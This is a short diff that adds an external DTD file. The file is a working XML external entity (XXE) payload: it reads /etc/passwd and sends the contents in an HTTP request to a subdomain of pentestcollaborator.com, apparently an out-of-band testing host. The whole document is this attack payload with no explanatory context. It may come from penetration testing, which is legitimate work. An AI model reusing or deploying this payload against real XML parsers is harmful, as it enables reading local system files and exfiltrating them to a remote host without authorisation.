@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://1987vdnwekc00fd3xfnhjh51osulic61.pentestcollaborator.com/?x=%file;'>">
+%eval;
+%exfil;
